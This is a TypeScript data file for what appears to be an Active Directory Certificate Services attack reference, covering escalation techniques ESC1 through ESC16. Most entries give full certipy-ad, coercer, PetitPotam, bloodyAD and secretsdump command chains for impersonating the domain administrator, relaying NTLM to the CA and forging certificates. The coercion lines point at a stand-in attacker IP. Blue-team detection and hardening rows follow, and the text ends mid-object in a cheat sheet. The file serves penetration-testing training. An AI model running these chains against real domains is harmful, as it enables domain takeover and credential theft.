import type {
  BlueTeamRow,
  CheatSheet,
  DecisionTable,
  EscCase,
  EscGroupMeta,
  PatchContext,
} from "./types";

export const groups: EscGroupMeta[] = [
  {
    id: "plantilla",
    label: "Template misconfiguration",
    description: "The problem is how a specific certificate template is configured.",
    escs: [1, 2, 3, 13, 15],
    color: "oklch(0.65 0.16 220)",
  },
  {
    id: "acl",
    label: "Permissions / ACL",
    description: "You have write permissions where you should not: template, PKI objects, or the CA.",
    escs: [4, 5, 7],
    color: "oklch(0.7 0.16 55)",
  },
  {
    id: "config-ca",
    label: "CA configuration",
    description: "A global CA flag or setting makes the whole system vulnerable.",
    escs: [6, 16],
    color: "oklch(0.75 0.15 300)",
  },
  {
    id: "relay",
    label: "Service relay",
    description: "The CA accepts NTLM authentication and can be relayed over HTTP or RPC.",
    escs: [8, 11],
    color: "oklch(0.6 0.18 25)",
  },
  {
    id: "mapping",
    label: "Certificate mapping",
    description: "The DC incorrectly maps the certificate to an account, enabling impersonation.",
    escs: [9, 10, 14],
    color: "oklch(0.7 0.14 160)",
  },
  {
    id: "acceso-ca",
    label: "CA access",
    description: "Separate case: you already have code execution on the CA server.",
    escs: [12],
    color: "oklch(0.55 0.15 30)",
  },
];

export const escCases: EscCase[] = [
  {
    id: 1,
    name: "ESC1 — Arbitrary SAN",
    shortName: "ESC1",
    group: "plantilla",
    frequency: 5,
    tagline: "The king, the most common. You set the SAN yourself and impersonate any user.",
    vulnerability: [
      "The template allows the enrollee to specify the Subject Alternative Name (SAN).",
      "The template is usable for authentication (Client Authentication EKU).",
      "Requires Manager Approval is disabled.",
      "The attacker has enrollment rights (for example, Domain Users).",
    ],
    detection:
      "ESC1 : 'CORP.LOCAL\\\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication",
    attack: [
      "# Request a certificate as the target (administrator)",
      "certipy-ad req -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -target \"$CA_HOST\" -ca 'CA-NAME' -template 'PLANTILLA_VULN' \\",
      "  -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'",
      "",
      "# Authenticate with the certificate to obtain the NT hash",
      'certipy-ad auth -pfx administrator.pfx -dc-ip "$DC_IP"',
    ],
    notes: [
      "Requirements: Enrollee Supplies Subject = True, Client Authentication, Manager Approval = False, and Enrollment Rights for the attacker.",
      "On environments patched with KB5014754, auth may fail if the target's -sid is not included.",
    ],
  },
  {
    id: 2,
    name: "ESC2 — Any Purpose / no EKU",
    shortName: "ESC2",
    group: "plantilla",
    frequency: 3,
    tagline:
      "Template with 'Any Purpose' EKU or no EKU: the certificate works for anything, including acting as an Enrollment Agent.",
    vulnerability: [
      "The template has the 'Any Purpose' EKU (OID 2.5.29.37.0) or has no EKU at all.",
      "The issued certificate works for any purpose, including authentication.",
      "Any Purpose includes the Certificate Request Agent EKU (OID 1.3.6.1.4.1.311.20.2.1): that is why Certipy often flags the same template as both ESC2 and ESC3.",
    ],
    detection: "ESC2 : Template can be used for any purpose.",
    attack: [
      "# 1. Request the 'Any Purpose' certificate (your agent certificate)",
      "certipy-ad req -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -target \"$CA_HOST\" -ca 'CA-NAME' -template 'PLANTILLA_ANYPURPOSE'",
      "",
      "# 2. Use it to request a cert ON BEHALF OF Administrator",
      "certipy-ad req -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -target \"$CA_HOST\" -ca 'CA-NAME' -template 'User' \\",
      "  -pfx user.pfx -on-behalf-of 'CORP\\\\administrator'",
      "",
      "# 3. auth with the administrator certificate",
      'certipy-ad auth -pfx administrator.pfx -dc-ip "$DC_IP"',
    ],
    notes: [
      "Sub-case of ESC3: Certipy overlaps ESC2/ESC3 because Any Purpose implies Certificate Request Agent. The abuse flow is the same (-on-behalf-of).",
      "Difference from ESC1: you cannot set the SAN, but you can use the cert as an agent.",
    ],
  },
  {
    id: 3,
    name: "ESC3 — Enrollment Agent",
    shortName: "ESC3",
    group: "plantilla",
    frequency: 3,
    tagline:
      "Template with the Certificate Request Agent EKU. You request certs on behalf of other users.",
    vulnerability: [
      "The template has the 'Certificate Request Agent' EKU (OID 1.3.6.1.4.1.311.20.2.1).",
      "An Enrollment Agent can request certificates on behalf of other users.",
    ],
    detection: "ESC3 : Template has Certificate Request Agent EKU set.",
    attack: [
      "# 1. Request the Enrollment Agent certificate",
      "certipy-ad req -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -target \"$CA_HOST\" -ca 'CA-NAME' -template 'ESC3-Agent'",
      "",
      "# 2. Use the agent to request a cert on behalf of Administrator",
      "certipy-ad req -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -target \"$CA_HOST\" -ca 'CA-NAME' -template 'User' \\",
      "  -pfx user.pfx -on-behalf-of 'CORP\\\\administrator'",
      "",
      "# 3. auth",
      'certipy-ad auth -pfx administrator.pfx -dc-ip "$DC_IP"',
    ],
    notes: [
      "The -on-behalf-of parameter is the heart of the attack: it specifies who you request the certificate for.",
      "It is a legitimate ADCS feature that is poorly restricted.",
    ],
  },
  {
    id: 4,
    name: "ESC4 — Write access on the template",
    shortName: "ESC4",
    group: "acl",
    frequency: 4,
    tagline:
      "You have write permissions on a template. You turn it into ESC1, exploit it, and restore it.",
    vulnerability: [
      "You have dangerous permissions on a template: WriteProperty, GenericWrite, GenericAll, WriteDacl, or WriteOwner.",
      "The template is not vulnerable by itself — you can edit it to make it vulnerable.",
    ],
    detection:
      "ESC4 : 'CORP.LOCAL\\\\user' has dangerous permissions (WriteProperty / GenericWrite / GenericAll / WriteDacl / WriteOwner)",
    attack: [
      "# 1. Make the template vulnerable (Certipy v5 auto-backs up to .json)",
      "certipy-ad template -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -template 'PLANTILLA' -write-default-configuration",
      "cp PLANTILLA.json backup_seguro.json",
      "",
      "# 2. Exploit as ESC1",
      "certipy-ad req -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -target \"$CA_HOST\" -ca 'CA-NAME' -template 'PLANTILLA' \\",
      "  -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'",
      'certipy-ad auth -pfx administrator.pfx -dc-ip "$DC_IP"',
      "",
      "# 3. RESTORE (mandatory)",
      "certipy-ad template -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -template 'PLANTILLA' -write-configuration PLANTILLA.json -no-save",
    ],
    notes: [
      "Always restore the template when finished so you do not break the PKI.",
      "Certipy v5 performs an automatic backup, but an extra manual copy is still wise.",
    ],
  },
  {
    id: 5,
    name: "ESC5 — ACL on ADCS objects",
    shortName: "ESC5",
    group: "acl",
    frequency: 2,
    tagline:
      "Weak permissions on ADCS objects that are not templates: CA, NTAuthCertificates, PKI containers.",
    vulnerability: [
      "Control over the CA server object in Active Directory.",
      "Control over the NTAuthCertificates container (defines which CAs are trusted).",
      "Control over PKI container objects (CN=Public Key Services).",
    ],
    detection:
      "find flags dangerous permissions on CA/PKI objects. Fine-grained enumeration is done with BloodHound or by querying ACLs.",
    attack: [
      "# There is no single command. Abuse depends on the controlled object:",
      "#  - Control over NTAuthCertificates → add your own malicious CA.",
      "#  - Control over the CA object → possible path to ESC7.",
      "#  - Control over a template via this object → ESC4.",
      "",
      "# Enumerate BloodHound edges on ADCS objects.",
      "# Conceptual ACL write example (with tools like dacledit):",
      "dacledit -d corp.local -u user -p pass -dc-ip \"$DC_IP\" --target 'CN=...,CN=Public Key Services' ...",
    ],
    notes: [
      "ESC5 is the ACL catch-all: any PKI object whose control gives you power over the certificate system.",
      "You reason about it with the BloodHound graph, not a single command.",
    ],
  },
  {
    id: 6,
    name: "ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2",
    shortName: "ESC6",
    group: "config-ca",
    frequency: 3,
    tagline:
      "The CA has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled: it accepts an arbitrary SAN on any request.",
    vulnerability: [
      "The CA has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled.",
      "With this flag, the CA accepts an arbitrary SAN even if the template does not allow it.",
    ],
    detection: "ESC6 : Certificate Authority has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set.",
    attack: [
      "# Request a certificate with any auth template (e.g. User) + arbitrary SAN",
      "certipy-ad req -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -target \"$CA_HOST\" -ca 'CA-NAME' -template 'User' \\",
      "  -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'",
      "",
      'certipy-ad auth -pfx administrator.pfx -dc-ip "$DC_IP"',
    ],
    notes: [
      "With EDITF_ATTRIBUTESUBJECTALTNAME2, ESC6 lets you inject the target SID into the SAN (format URL=tag:microsoft.com,2022-09-14:sid:<VALUE>). That forces the KDC to map by that SID even with Full Enforcement (StrongCertificateBindingEnforcement=2).",
      "ESC6 does work alone against fully patched DCs: it does not need to be combined with ESC9/10/16. ESC6+ESC9 or ESC6+ESC16 chains exist for other reasons (missing SID extension), not because ESC6 'is not enough'.",
    ],
  },
  {
    id: 7,
    name: "ESC7 — Permissions on the CA",
    shortName: "ESC7",
    group: "acl",
    frequency: 4,
    tagline:
      "You have ManageCA or ManageCertificates on the CA. You become an officer, enable SubCA, and approve your own request.",
    vulnerability: [
      "You have the ManageCA permission on the CA.",
      "With ManageCA + ManageCertificates you can manage templates and approve requests.",
    ],
    detection:
      "ESC7 : 'CORP.LOCAL\\\\user' has dangerous permissions (ManageCA / ManageCertificates)",
    attack: [
      "# Add yourself as officer (if you only have ManageCA)",
      "certipy-ad ca -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" -ca 'CA-NAME' -add-officer 'user'",
      "",
      "# Enable the SubCA template",
      "certipy-ad ca -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" -ca 'CA-NAME' -enable-template 'SubCA'",
      "",
      "# Request with SubCA (it gets denied → note the Request ID)",
      "certipy-ad req -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" -target \"$CA_HOST\" \\",
      "  -ca 'CA-NAME' -template 'SubCA' -upn 'administrator@corp.local' -sid 'S-1-...-500'",
      "",
      "# Approve the failed request yourself",
      "certipy-ad ca -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" -ca 'CA-NAME' -issue-request <ID>",
      "",
      "# Retrieve the issued certificate",
      "certipy-ad req -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" -target \"$CA_HOST\" \\",
      "  -ca 'CA-NAME' -retrieve <ID>",
      'certipy-ad auth -pfx administrator.pfx -dc-ip "$DC_IP"',
    ],
    notes: [
      "With ManageCA you can enable the ESC6 flag or add yourself as officer.",
      "With ManageCA + ManageCertificates you can approve failed requests (SubCA abuse).",
    ],
  },
  {
    id: 8,
    name: "ESC8 — NTLM relay to Web Enrollment",
    shortName: "ESC8",
    group: "relay",
    frequency: 5,
    tagline:
      "The CA exposes Web Enrollment over HTTP and accepts NTLM relay. You coerce a DC to authenticate to you and relay to the web interface.",
    vulnerability: [
      "The CA has the web enrollment interface enabled (http://ca/certsrv/).",
      "It accepts NTLM authentication and does not enforce HTTPS or Channel Binding (EPA).",
    ],
    detection: "ESC8 : Web Enrollment is enabled and Channel Binding is not enforced (o HTTP)",
    attack: [
      "# Terminal 1: Certipy in relay mode",
      "certipy-ad relay -target 'http://CA_IP' -template 'DomainController'",
      "",
      "# Terminal 2: coerce the DC (2026: Coercer groups several methods)",
      "coercer coerce -u user -p pass -d corp.local -t DC_IP -l ATACANTE_IP",
      "# Alternatives: PrinterBug (MS-RPRN), DFSCoerce (MS-DFSNM).",
      "# Classic (often patched): python3 PetitPotam.py ATACANTE_IP DC_IP",
      "",
      "# dc.pfx → auth → DC$ hash → DCSync",
      'certipy-ad auth -pfx dc.pfx -dc-ip "$DC_IP"',
      "impacket-secretsdump -hashes ':DC_HASH' 'corp.local/DC$@DC_IP' -just-dc",
    ],
    notes: [
      "Certipy v5 improves ESC8: it checks HTTPS and whether Channel Binding is enforced.",
      "It can even relay to HTTPS endpoints if EPA is not present.",
      "PetitPotam (MS-EFSRPC) is patched in many environments; prefer Coercer or other coercion methods.",
    ],
  },
  {
    id: 9,
    name: "ESC9 — No SID security extension",
    shortName: "ESC9",
    group: "mapping",
    frequency: 2,
    tagline:
      "The template does not include the SID security extension. Mapping is weak and is abused by manipulating the UPN.",
    vulnerability: [
      "The template has the CT_FLAG_NO_SECURITY_EXTENSION flag.",
      "The issued certificate does NOT carry the requester's real SID.",
      "Combined with control over a victim account, it enables impersonation via UPN.",
    ],
    detection:
      "ESC9 : Template has CT_FLAG_NO_SECURITY_EXTENSION flag (no szOID_NTDS_CA_SECURITY_EXT)",
    attack: [
      "# Scenario: you control 'victima' (e.g. GenericWrite on it)",
      "# 1. Change 'victima' UPN to the target's (without @)",
      "certipy-ad account update -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -user 'victima' -upn 'administrator'",
      "",
      "# 2. Request the cert as 'victima' with the ESC9 template",
      "certipy-ad req -u 'victima@corp.local' -p 'victima_pass' -dc-ip \"$DC_IP\" \\",
      "  -target \"$CA_HOST\" -ca 'CA-NAME' -template 'PLANTILLA_ESC9'",
      "",
      "# 3. Restore 'victima' UPN",
      "certipy-ad account update -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -user 'victima' -upn 'victima@corp.local'",
      "",
      "# 4. auth (maps to administrator via UPN)",
      'certipy-ad auth -pfx administrator.pfx -dc-ip "$DC_IP" -domain corp.local',
    ],
    notes: [
      "Requires control over a victim account (for example, ability to change its UPN).",
      "It is a bypass of the strong mapping introduced by KB5014754.",
      "Temporal (lab 2026): weak mapping became unusable with mandatory Full Enforcement since September 2025 (Microsoft). This vector only applies if the environment still does not enforce it.",
    ],
  },
  {
    id: 10,
    name: "ESC10 — Weak certificate mapping",
    shortName: "ESC10",
    group: "mapping",
    frequency: 2,
    tagline:
      "The DC registry allows weak UPN mapping. Similar to ESC9, but the flaw is in the DC configuration.",
    vulnerability: [
      "CertificateMappingMethods allows weak mapping by UPN.",
      "StrongCertificateBindingEnforcement = 0 disables strong mapping.",
      "The flaw is in the DC registry, not in a template flag.",
    ],
    detection:
      "ESC10 : Weak certificate mapping (CertificateMappingMethods / StrongCertificateBindingEnforcement)",
    attack: [
      "# 1. Change the UPN of an account you control to the target's",
      "certipy-ad account update -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -user 'victima' -upn 'administrator'",
      "",
      "# 2. Request a cert as 'victima' with any auth template",
      "certipy-ad req -u 'victima@corp.local' -p 'victima_pass' -dc-ip \"$DC_IP\" \\",
      "  -target \"$CA_HOST\" -ca 'CA-NAME' -template 'User'",
      "",
      "# 3. Restore the UPN",
      "certipy-ad account update -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -user 'victima' -upn 'victima@corp.local'",
      "",
      "# 4. auth (UPN mapping)",
      'certipy-ad auth -pfx administrator.pfx -dc-ip "$DC_IP"',
    ],
    notes: [
      "ESC9 vs ESC10: ESC9 is a template flaw; ESC10 is a DC registry flaw.",
      "Both are exploited the same way: by manipulating the UPN of an account you control.",
      "Temporal (lab 2026): depends on the environment not applying mandatory Full Enforcement since Sept-2025.",
    ],
  },
  {
    id: 11,
    name: "ESC11 — Relay to the RPC interface (ICPR)",
    shortName: "ESC11",
    group: "relay",
    frequency: 2,
    tagline:
      "The CA RPC interface (MS-ICPR) does not require encryption. You can relay NTLM over RPC to request certs.",
    vulnerability: [
      "The CA ICPR (Internal Certificate Processing) interface does not require encryption.",
      "IF_ENFORCEENCRYPTICERTREQUEST is disabled.",
    ],
    detection: "ESC11 : Encryption is not enforced for ICPR requests (relay to RPC possible)",
    attack: [
      "# Relay to the CA RPC interface",
      "certipy-ad relay -target 'rpc://CA_IP' -ca 'CA-NAME' -template 'DomainController'",
      "",
      "# + coerce the target (prefer Coercer in 2026 labs)",
      "coercer coerce -u user -p pass -d corp.local -t DC_IP -l ATACANTE_IP",
      "# Classic (often patched): python3 PetitPotam.py ATACANTE_IP DC_IP",
      "",
      "# → target cert → auth → hash",
      'certipy-ad auth -pfx dc.pfx -dc-ip "$DC_IP"',
    ],
    notes: [
      "Like ESC8 but over RPC instead of HTTP.",
      "Certipy checks the CA enforce_encrypt_icertrequest property.",
      "PetitPotam (MS-EFSRPC) is patched in many environments; prefer Coercer (MS-RPRN / DFSCoerce / EFSRPC).",
    ],
  },
  {
    id: 12,
    name: "ESC12 — Shell on the CA (YubiHSM)",
    shortName: "ESC12",
    group: "acceso-ca",
    frequency: 1,
    tagline:
      "You already have a shell on the CA server. If the private key is in a YubiHSM with an accessible PIN, you forge certs (Golden Certificate).",
    vulnerability: [
      "The CA private key is in a YubiHSM (hardware security module).",
      "The HSM PIN is often stored so the service can start without interaction.",
      "Requires prior code execution on the CA server.",
    ],
    detection:
      "Certipy does NOT detect or exploit ESC12 directly. It is identified after obtaining a shell on the CA.",
    attack: [
      "# Once you have a shell on the CA, access the key via the YubiHSM",
      "# The PIN is often in the service configuration or accessible in memory.",
      "",
      "# With the CA key → Golden Certificate",
      "certipy-ad forge -ca-pfx 'CA.pfx' -upn 'administrator@corp.local' \\",
      "  -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'",
    ],
    notes: [
      "ESC12 is not remote escalation: it is post-exploitation once inside the CA.",
      "Golden Certificate lets you forge any valid certificate.",
    ],
  },
  {
    id: 13,
    name: "ESC13 — Issuance policy with group OID",
    shortName: "ESC13",
    group: "plantilla",
    frequency: 2,
    tagline:
      "The template has an issuance policy linked to a privileged group. The cert grants those privileges when you authenticate.",
    vulnerability: [
      "The template has an issuance policy (OID) linked to an AD group.",
      "The msDS-OIDToGroupLink attribute links the OID to the group.",
      "The issued certificate grants effective group membership during authentication.",
    ],
    detection:
      "ESC13 : Template has an issuance policy linked to a privileged group (OID group link)",
    attack: [
      "# 1. Request the cert from the template with the privileged issuance policy",
      "certipy-ad req -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -target \"$CA_HOST\" -ca 'CA-NAME' -template 'PLANTILLA_ESC13'",
      "",
      "# 2. auth → the TGT includes membership of the privileged group",
      'certipy-ad auth -pfx user.pfx -dc-ip "$DC_IP"',
      "",
      "# Use BloodHound to see what privileges the OID-linked group has",
    ],
    notes: [
      "Certipy detects ESC13, but BloodHound tells you what privileges the linked group gives you.",
      "No need to touch the SAN or the UPN.",
    ],
  },
  {
    id: 14,
    name: "ESC14 — Weak explicit mapping (altSecurityIdentities)",
    shortName: "ESC14",
    group: "mapping",
    frequency: 2,
    tagline:
      "The altSecurityIdentities attribute explicitly maps a certificate to an account. If it is weak and writable, you can impersonate.",
    vulnerability: [
      "The altSecurityIdentities attribute allows explicitly mapping a certificate to an account.",
      "Configured weakly (for example, by issuer+subject instead of strong fields).",
      "Requires write permissions on an account's altSecurityIdentities.",
    ],
    detection:
      "Certipy does NOT detect ESC14 directly. It is identified with BloodHound (write on altSecurityIdentities).",
    attack: [
      "# 1. Discover with BloodHound that you can write altSecurityIdentities on a privileged account.",
      "# 2. Write a weak explicit mapping that associates your cert to that account (via LDAP).",
      "",
      "# Conceptual example with bloodyAD:",
      "bloodyAD -u user -p pass -d corp.local --host DC_IP set object victima \\",
      "  altSecurityIdentities -v 'X509:<I>...<S>...'",
      "",
      "# 3. Authenticate with your cert → the DC maps it to the privileged account.",
    ],
    notes: [
      "Best identified with BloodHound and exploited manually via LDAP.",
      "Requires write permissions on the victim's altSecurityIdentities.",
      "Temporal (lab 2026): weak mapping became unusable with mandatory Full Enforcement since September 2025. This vector only applies if the environment still does not enforce it.",
    ],
  },
  {
    id: 15,
    name: "ESC15 — EKUwu (application policies in CSR)",
    shortName: "ESC15",
    group: "plantilla",
    frequency: 2,
    tagline:
      "Affects v1 templates. You inject application policies (Client Auth EKU) into your own CSR and turn a harmless template into ESC1.",
    vulnerability: [
      "Affects schema version 1 templates.",
      "Even if the template has no authentication EKU, the requester can inject application policies into the CSR.",
      "Discovered by TrustedSec (October 2024), nicknamed 'EKUwu'.",
    ],
    detection:
      "ESC15 : Enrollee supplies subject on a v1 template (application policies injectable / EKUwu)",
    attack: [
      "# Inject Client Authentication application policy into a v1 template",
      "certipy-ad req -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -target \"$CA_HOST\" -ca 'CA-NAME' -template 'PLANTILLA_V1' \\",
      "  -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \\",
      "  -application-policies '1.3.6.1.5.5.7.3.2'",
      "",
      "# 1.3.6.1.5.5.7.3.2 = Client Authentication",
      'certipy-ad auth -pfx administrator.pfx -dc-ip "$DC_IP"',
    ],
    notes: [
      "v1 templates only. On v2+ the CA does not accept application policies injected from the CSR.",
      "Upgrading v1 templates to v2+ mitigates EKUwu.",
    ],
  },
  {
    id: 16,
    name: "ESC16 — CA without global SID extension",
    shortName: "ESC16",
    group: "config-ca",
    frequency: 2,
    tagline:
      "The CA does not apply the SID security extension globally. Like ESC9 but at the whole-CA level.",
    vulnerability: [
      "The CA is configured NOT to include the SID security extension in any certificate.",
      "New in Certipy v5 (2025).",
      "Mapping is weak for all certs issued by the CA.",
    ],
    detection:
      "ESC16 : CA disables the SID security extension globally (szOID_NTDS_CA_SECURITY_EXT)",
    attack: [
      "# 1. Change the UPN of an account you control to the target's",
      "certipy-ad account update -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -user 'victima' -upn 'administrator'",
      "",
      "# 2. Request a cert as 'victima' with any auth template",
      "certipy-ad req -u 'victima@corp.local' -p 'victima_pass' -dc-ip \"$DC_IP\" \\",
      "  -target \"$CA_HOST\" -ca 'CA-NAME' -template 'User'",
      "",
      "# 3. Restore the UPN",
      "certipy-ad account update -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -user 'victima' -upn 'victima@corp.local'",
      "",
      "# 4. auth",
      'certipy-ad auth -pfx administrator.pfx -dc-ip "$DC_IP"',
    ],
    notes: [
      "Like ESC9 but at the global CA level, not a specific template.",
      "Any auth template issued by the CA becomes abusable with UPN manipulation.",
      "Temporal (lab 2026): depends on the environment not applying mandatory Full Enforcement since Sept-2025.",
    ],
  },
];

export const patchContext: PatchContext = {
  title: "The KB5014754 patch, ESC6, and strong mapping",
  paragraphs: [
    "Before May 2022, certificates were mapped to accounts by UPN/SAN (weak mapping). That is why ESC1 worked 'plain': you set SAN=Administrator and the DC mapped you to Administrator.",
    "The KB5014754 patch ('Certifried') introduced the SID security extension (szOID_NTDS_CA_SECURITY_EXT): the certificate embeds the requester's real SID. The DC checks whether the cert SID matches the account it claims to be. This is strong mapping.",
    "ESC1 on patched environments: if you only set the UPN/SAN without the target SID, auth fails because the requester SID reveals you are not the admin. That is why Certipy asks for the target `-sid`.",
    "ESC6 is different: with EDITF_ATTRIBUTESUBJECTALTNAME2 enabled, you can inject the malicious SID into the SAN (URL=tag:microsoft.com,2022-09-14:sid:<VALUE>). That forces mapping even with Full Enforcement (StrongCertificateBindingEnforcement=2). ESC6 works alone; it does not require ESC9/10/16.",
    "ESC9, ESC10, and ESC16 are weak-mapping bypasses: they avoid or disable the SID extension to fall back to UPN mapping. Since September 2025 Microsoft makes Full Enforcement mandatory; these vectors only apply if the environment still does not enforce it.",
  ],
  rule: [
    "ESC6 with EDITF enabled: works alone even with Full Enforcement (SID injected into the SAN).",
    "ESC1 on patched environments: use the target `-sid`; if auth fails, check mapping (ESC9/10/16) or the -sid flag.",
    "ESC9/10/14/16: depend on weak mapping — unusable if Full Enforcement is mandatory (Sept-2025+).",
    "The -sid flag on req embeds the correct target SID when strong mapping applies.",
  ],
  whySid:
    "The -sid 'S-1-5-21-...-500' flag embeds the target SID in the certificate. In ESC6, Certipy uses the SAN-with-embedded-SID mechanism that the EDITF flag allows. If auth fails after a req that looked correct, check -sid or whether you are facing a weak-mapping case (ESC9/10/16).",
};

export const decisionTable: DecisionTable = {
  title: "Decision table: 'find says X — what do I do?'",
  steps: [
    "certipy-ad find -u 'user@dom' -p 'pass' -dc-ip IP -vulnerable -stdout",
    "Look up the ESC in the table → methodology.",
    "Go to its lab section → exact command.",
    "Run it. If auth fails → check -sid and the patch.",
    "If mapping (9/10/16) → manipulate the UPN. If relay (8/11) → you need coercion. If ACL (4/5/7) → first modify something.",
  ],
  rows: [
    { esc: 1, action: "req with -upn admin -sid → auth" },
    { esc: 2, action: "req (agent) → req -on-behalf-of → auth" },
    { esc: 3, action: "req (agent) → req -on-behalf-of → auth" },
    { esc: 4, action: "template -write-default-config → ESC1 → restore" },
    { esc: 5, action: "ACL abuse on PKI object (BloodHound)" },
    {
      esc: 6,
      action: "req -template User -upn admin -sid → auth (ESC6 alone is enough; SID in SAN via EDITF)",
    },
    {
      esc: 7,
      action: "ca -add-officer / -enable-template SubCA → issue-request → retrieve → auth",
    },
    { esc: 8, action: "relay http:// + coercion → auth (DC$)" },
    { esc: 9, action: "account update -upn + req + restore → auth" },
    { esc: 10, action: "account update -upn + req + restore → auth (DC registry flaw)" },
    { esc: 11, action: "relay rpc:// + coercion → auth" },
    { esc: 12, action: "shell on the CA → forge (Golden Cert)" },
    { esc: 13, action: "req template with group OID → auth (+ BloodHound)" },
    { esc: 14, action: "write altSecurityIdentities (LDAP) → auth (BloodHound)" },
    { esc: 15, action: "req -application-policies + -upn -sid → auth (v1 template, EKUwu)" },
    { esc: 16, action: "account update -upn + req + restore → auth (CA without global SID)" },
  ],
};

export const blueTeam: BlueTeamRow[] = [
  {
    group: "plantilla",
    detection: [
      "Events 4886/4887 with SAN/EKU that does not match the requester.",
      "Certificates with injected application policies.",
    ],
    hardening: [
      "Remove 'Enrollee Supplies Subject' from authentication templates.",
      "Do not use 'Any Purpose' EKU or leave the EKU empty.",
      "Restrict the 'Certificate Request Agent' EKU and enrollment agents.",
      "Require manager approval on sensitive templates.",
      "Review issuance policies linked to groups (msDS-OIDToGroupLink).",
      "Upgrade v1 templates to v2+ (mitigates EKUwu/ESC15).",
    ],
  },
  {
    group: "acl",
    detection: [
      "Events 4899/4900 (template modified).",
      "ACL changes on PKI / CA objects.",
    ],
    hardening: [
      "Audit with BloodHound who has WriteDacl/GenericAll/GenericWrite on templates, the CA, and PKI objects.",
      "Restrict ManageCA/ManageCertificates to PKI administrators.",
    ],
  },
  {
    group: "config-ca",
    detection: ["EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled.", "CA without global SID extension."],
    hardening: [
      "Remove the EDITF_ATTRIBUTESUBJECTALTNAME2 flag.",
      "Ensure the CA applies the SID security extension globally.",
    ],
  },
  {
    group: "relay",
    detection: [
      "Coercion (Coercer / PrinterBug / DFSCoerce / PetitPotam) followed by DC$ authentication to the CA.",
      "Unencrypted ICPR requests.",
    ],
    hardening: [
      "Disable Web Enrollment or enforce HTTPS + Channel Binding (EPA).",
      "Enforce encryption on ICPR requests (IF_ENFORCEENCRYPTICERTREQUEST).",
      "Mitigate coercion broadly: not just PetitPotam (MS-EFSRPC). Restrict MS-RPRN/spooler and MS-DFSNM where not needed; apply known coercion patches.",
    ],
  },
  {
    group: "mapping",
    detection: [
      "UPN changes followed by cert issuance.",
      "Writes to altSecurityIdentities.",
    ],
    hardening: [
      "Apply KB5014754 and enforce strong mapping (StrongCertificateBindingEnforcement = 2). Since Sept-2025 Full Enforcement is mandatory on updated environments.",
      "Do not use weak UPN mapping.",
      "Restrict writes to altSecurityIdentities and UPN.",
    ],
  },
];

export const cheatSheet: CheatSheet = {
  title: "ADCS ESC Cheat Sheet",
  intro: [
    "ALWAYS FIRST:",
    "certipy-ad find -u 'user@dom' -p 'pass' -dc-ip IP -vulnerable -stdout",
    "# if LDAPS fails: -ldap-scheme ldap",
    "# auth ALWAYS closes: certipy-ad auth -pfx X.pfx -dc-ip IP",
  ],
  blocks: [
    {
      title: "ESC1 — Arbitrary SAN",
      lines: ["certipy-ad req ... -template VULN -upn 'administrator@dom' -sid 'S-...-500'"],
    },
    {
      title: "ESC2 / ESC3 — Any Purpose / Enrollment Agent",
      lines: [
        "certipy-ad req ... -template AGENTE",
        "certipy-ad req ... -template User -pfx user.pfx -on-behalf-of 'DOM\\administrator'",
      ],
    },
    {
      title: "ESC4 — write on template",
      lines: [
        "certipy-ad template ... -template X -write-default-configuration",
        "# ... req as ESC1 + auth ...",
        "certipy-ad template ... -template X -write-configuration X.json -no-save",
      ],
    },
    {
      title: "ESC6 — EDITF flag",
      lines: ["certipy-ad req ... -template User -upn 'administrator@dom' -sid 'S-...-500'"],
    },
    {
      title: "ESC7 — ManageCA / ManageCertificates",
      lines: [
        "certipy-ad ca ... -add-officer user",
        "certipy-ad ca ... -enable-template SubCA",
        "certipy-ad req ... -template SubCA -upn admin@dom -sid ...",
        "certipy-ad ca ... -issue-request <ID>",
        "certipy-ad req ... -retrieve <ID>",
      ],
    },
    {
      title: "ESC8 / ESC11 — relay",
      lines: [
        "certipy-ad relay -target 'http://CA_IP' -template DomainController",
        "certipy-ad relay -target 'rpc://CA_IP' -ca CA -template DomainController",
        "coercer coerce -u user -p pass -d dom -t DC_IP -l ATACANTE_IP",
        "# classic (often patched): PetitPotam.py ATACANTE_IP DC_IP",
      ],
    },
    {
      title: "ESC9 / ESC10 / ESC16 — mapping",
      lines: [
        "certipy-ad account update ... -user victima -upn 'administrator'",
        "certipy-ad req ... -template <plantilla>",
        "certipy-ad account update ... -user victima -upn 'victima@dom'",
        "certipy-ad auth -pfx administrator.pfx -dc-ip IP",
      ],
    },
    {
